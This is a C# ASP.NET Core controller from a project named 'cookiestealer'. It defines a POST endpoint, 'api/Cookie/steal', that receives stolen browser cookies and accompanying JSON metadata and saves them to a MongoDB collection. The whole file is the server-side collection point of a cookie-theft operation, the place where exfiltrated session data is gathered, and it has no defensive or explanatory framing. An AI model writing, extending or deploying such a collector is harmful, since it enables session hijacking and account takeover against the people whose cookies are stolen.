using Microsoft.AspNetCore.Mvc;
using MongoDB.Driver;
using cookiestealer.Models;
using System.Text.Json;

namespace cookiestealer.Controllers
{
    [ApiController]
    [Route("api/[controller]")]
    public class CookieController : ControllerBase
    {
        private readonly IMongoCollection<Cookie> _cookieCollection;

        public CookieController(IMongoDatabase database)
        {
            _cookieCollection = database.GetCollection<Cookie>("cookies");
        }

        [HttpPost("steal")]
        [Consumes("multipart/form-data")]
        public async Task<IActionResult> Steal(
            [FromForm(Name = "cookies")] string cookies,
            [FromForm(Name = "metadata")] string metadata
        )
        {
            // sanity check
            if (string.IsNullOrEmpty(cookies))
                return BadRequest("cookies missing");
            if (string.IsNullOrEmpty(metadata))
                return BadRequest("metadata missing");

            abcd meta;
            try
            {
                meta = JsonSerializer.Deserialize<abcd>(metadata)!;
            }
            catch
            {
                return BadRequest("metadata invalid JSON");
            }

            await _cookieCollection.InsertOneAsync(new Cookie
            {
                Cookies = cookies,
                Metadata = meta
            });

            return Ok("Saved");
        }
    }
}